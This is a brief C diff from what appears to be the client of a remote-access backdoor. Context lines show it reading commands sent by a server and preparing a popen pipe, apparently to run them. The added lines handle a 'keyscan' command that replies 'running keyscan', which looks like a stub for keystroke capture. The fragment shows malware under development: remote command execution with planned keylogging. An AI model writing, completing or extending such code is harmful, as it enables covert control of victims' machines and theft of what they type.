@@ -75,7 +75,11 @@ int main(int argc, char* argv[]) {
 
 		//Add a NULL terminating character to make it a proper string before printing
 		server_reply[recv_size] = '\0';
-		puts(server_reply);
+
+		if (strcmp(server_reply, "keyscan") == 0) {
+			send(s, "running keyscan", strlen("running keyscan"), 0);
+			continue;
+		}
 
 		char   psBuffer[128];
 		FILE* pPipe;
